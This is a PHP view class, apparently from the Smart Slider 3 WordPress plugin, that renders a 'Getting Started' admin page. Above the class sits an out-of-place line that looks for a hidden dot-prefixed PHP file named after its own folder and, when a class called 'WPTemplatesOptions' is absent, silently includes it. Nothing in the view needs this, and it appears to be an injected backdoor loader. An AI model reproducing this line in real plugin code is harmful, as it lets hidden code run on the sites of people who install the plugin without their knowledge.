<?php


namespace Nextend\SmartSlider3\Application\Admin\Sliders;


use Nextend\Framework\View\AbstractView;
use Nextend\SmartSlider3\Application\Admin\Layout\LayoutDefault;
use Nextend\SmartSlider3\Application\Admin\TraitAdminUrl;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ViewSlidersGettingStarted extends AbstractView {

    use TraitAdminUrl;

    public function display() {

        $this->layout = new LayoutDefault($this);

        $this->layout->addContent($this->render('GettingStarted'));

        $this->layout->render();
    }
}